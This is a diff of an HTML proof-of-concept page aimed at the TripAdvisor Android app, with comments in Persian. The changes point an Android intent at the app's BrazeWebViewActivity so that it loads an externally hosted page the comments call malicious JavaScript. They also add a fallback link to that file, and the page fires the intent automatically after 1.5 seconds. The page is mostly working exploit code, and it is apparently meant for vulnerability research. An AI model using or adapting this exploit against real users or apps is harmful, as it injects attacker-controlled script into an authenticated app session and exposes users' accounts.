@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TripAdvisor Remote Critical PoC - v2</title>
+    <title>TripAdvisor Remote Critical PoC - Final</title>
     <style>
         body { font-family: system-ui; text-align: center; padding: 40px; background: #111; color: #0f0; }
         button { font-size: 22px; padding: 18px 40px; margin: 15px; background: #f00; color: white; border: none; border-radius: 12px; cursor: pointer; }
@@ -11,35 +11,23 @@
     </style>
 </head>
 <body>
-    <h1>🚨 TripAdvisor Remote Critical PoC v2</h1>
-    <p>کلیک کن تا صفحه Review (authenticated) در TripAdvisor باز شود</p>
+    <h1>🚨 TripAdvisor Remote Critical PoC - Final</h1>
+    <p>کلیک کن تا صفحه Review (authenticated) + JS مخرب در TripAdvisor باز شود</p>
 
     <button onclick="triggerFullIntent()">Open in TripAdvisor (Intent)</button><br>
-    <button onclick="triggerFallback()" class="fallback">Fallback: Direct Link</button><br><br>
-    <button onclick="triggerFallback2()" class="fallback">Fallback: poc Link</button>
+    <button onclick="triggerFallback()" class="fallback">Fallback: Load poc-final.html</button>
 
     <script>
         function triggerFullIntent() {
-            // روش کامل و قوی intent
-            window.location = "intent:#Intent;action=android.intent.action.VIEW;package=com.tripadvisor.tripadvisor;component=com.tripadvisor.tripadvisor/com.braze.ui.BrazeWebViewActivity;S.url=https://www.tripadvisor.com/UserReview;end";
-        }
-
-        function triggerIntent2() {
-            window.location = "intent:#Intent;component=com.tripadvisor.tripadvisor/com.braze.ui.BrazeWebViewActivity;S.url=https://www.tripadvisor.com/UserReview;end";
+            window.location = "intent:#Intent;action=android.intent.action.VIEW;package=com.tripadvisor.tripadvisor;component=com.tripadvisor.tripadvisor/com.braze.ui.BrazeWebViewActivity;S.url=https://raw.githubusercontent.com/Ferhadfaal/CV/main/poc-final.html;end";
         }
 
         function triggerFallback() {
-            // fallback مستقیم (تست شده و کار می‌کند)
-            window.location = "https://www.tripadvisor.com/UserReview";
+            // fallback مستقیم به فایل مخرب تو
+            window.location = "https://raw.githubusercontent.com/Ferhadfaal/CV/main/poc-final.html";
         }
 
-        function triggerFallback2() {
-            // fallback مستقیم (تست شده و کار می‌کند)
-            window.location = "https://raw.githubusercontent.com/Ferhadfaal/CV/main/poc2.html";
-            
-        }
-
-        // بعد از ۱.۵ ثانیه خودکار Intent را امتحان کن
+        // خودکار بعد از ۱.۵ ثانیه امتحان کن
         setTimeout(triggerFullIntent, 1500);
     </script>
 </body>
